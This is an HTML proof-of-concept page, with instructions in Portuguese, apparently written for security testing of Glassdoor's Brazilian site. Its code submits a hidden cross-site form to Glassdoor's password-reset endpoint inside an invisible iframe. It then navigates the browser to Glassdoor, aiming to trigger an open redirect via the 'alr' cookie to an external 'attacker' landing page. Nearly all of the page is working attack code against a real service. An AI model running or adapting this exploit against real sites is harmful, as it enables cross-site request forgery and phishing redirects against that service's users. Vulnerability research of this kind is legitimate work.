<!doctype html>
<meta charset="utf-8">
<title>Glassdoor Redirect PoC – alr home</title>
<body>
<h2>PoC – Open Redirect via cookie <code>alr</code></h2>
<p>
1) Clique <b>Preparar redirecionamento</b> para setar <code>alr</code> apontando para este GitHub Pages.<br>
2) A página então abrirá <code>/member/home/index.htm</code>. Se o Glassdoor consumir o cookie,
você será redirecionado para <code>after-login.html</code> (seu domínio externo).<br>
</p>

<script>
  // landing do “atacante”
  const attackerLanding = "https://jonatamenezes.github.io/csrf-test/after-login.html";
</script>

<iframe id="sink" name="sink" style="display:none"></iframe>

<form id="prime" action="https://www.glassdoor.com.br/auth/account/password/forgot/initiate"
      method="POST" enctype="text/plain" target="sink">
  <textarea name="" id="payload" style="display:none">
{"emailAddress":"victim@example.com"}
  </textarea>
</form>

<button id="prep">Preparar redirecionamento + ir para /member/home</button>

<script>
  document.getElementById('prep').onclick = function () {
    document.getElementById('prime').submit();
    setTimeout(() => {
      // vai direto para o endpoint que vimos no Burp
      window.location.href = "https://www.glassdoor.com.br/index.htm";
    }, 1200);
  };
</script>
</body>
